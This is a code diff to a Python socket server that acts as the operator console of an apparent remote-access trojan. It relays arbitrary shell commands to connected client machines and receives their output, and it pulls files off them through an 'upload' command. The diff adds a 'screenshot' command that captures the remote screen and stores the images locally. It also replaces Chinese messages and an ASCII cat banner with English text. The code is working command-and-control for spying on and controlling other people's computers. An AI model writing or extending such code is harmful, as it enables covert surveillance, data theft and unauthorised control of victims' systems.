@@ -2,9 +2,17 @@ import socket
 import subprocess
 import threading
 import os
+import time
 
 def handle_client(client_socket, base_dir):
     current_dir = base_dir
+    # 获取脚本所在的目录
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    # 定义截图保存的子目录
+    screenshots_dir = os.path.join(script_dir, 'screenshots')
+    # 创建截图保存的子目录（如果不存在）
+    os.makedirs(screenshots_dir, exist_ok=True)
+
     while True:
         try:
             # 接收客户端发送的请求（这里可以添加认证机制）
@@ -26,7 +34,7 @@ def handle_client(client_socket, base_dir):
                         if os.path.isdir(path):
                             current_dir = path
                         else:
-                            print("没有相对应的文件捏~")
+                            print("No such directory")
                         continue
                     elif command.lower().startswith('upload '):
                         # 处理上传命令
@@ -40,25 +48,48 @@ def handle_client(client_socket, base_dir):
                                     if not bytes_read:
                                         break
                                     client_socket.sendall(bytes_read)
-                            print(f"文件 {file_path} 已上传")
+                            print(f"File {file_path} uploaded.")
                         else:
-                            print("没有相对应的文件捏~")
+                            print("File not found.")
                         continue
+                    elif command.lower() == 'screenshot':
+                        # 处理截屏命令
+                        client_socket.send(command.encode('utf-8'))
+                        # 接收截图信息
+                        request = client_socket.recv(1024)
+                        if not request:
+                            break
+                        request = request.decode('utf-8', errors='ignore')
+                        if request.lower().startswith('screenshot '):
+                            file_info = request[11:]
+                            file_path, file_size = file_info.split(' ')
+                            file_size = int(file_size)
+                            # 构建截图保存的完整路径
+                            file_full_path = os.path.join(screenshots_dir, os.path.basename(file_path))
+                            with open(file_full_path, 'wb') as f:
+                                while file_size > 0:
+                                    bytes_read = client_socket.recv(4096)
+                                    if not bytes_read:
+                                        break
+                                    f.write(bytes_read)
+                                    file_size -= len(bytes_read)
+                            print(f"Screenshot saved to {file_full_path}")
                     elif command.lower() == 'exit':
                         client_socket.send(command.encode('utf-8'))
                         break
-                    client_socket.send(command.encode('utf-8'))
-                    # 接收命令执行结果
-                    output = client_socket.recv(4096)
-                    if output:
-                        print(output.decode('utf-8', errors='ignore'))
                     else:
-                        print("没有收到输出")
+                        client_socket.send(command.encode('utf-8'))
+                        # 接收命令执行结果
+                        output = client_socket.recv(4096)
+                        if output:
+                            print(output.decode('utf-8', errors='ignore'))
+                        else:
+                            print("No output received")
             else:
-                print("无效的请求")
+                print("Invalid request")
                 break
         except Exception as e:
-            print(f"错误{e}")
+            print(f"Error: {e}")
             break
     client_socket.close()
 
@@ -70,19 +101,11 @@ def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((host, port))
     server.listen(5)
-    print("""
-欢迎使用脚本喵
-         .
-    ____/|
-    \ o.O|
-     |   |
-    =(_._)=
-""")
-    print(f"[*] 监听到{host}:{port}")
+    print(f"[*] Listening as {host}:{port}")
 
     while True:
         client, address = server.accept()
-        print(f"[*] {address[0]}:{address[1]}已连接")
+        print(f"[*] Accepted connection from {address[0]}:{address[1]}")
         client_handler = threading.Thread(target=handle_client, args=(client, base_dir))
         client_handler.start()
 
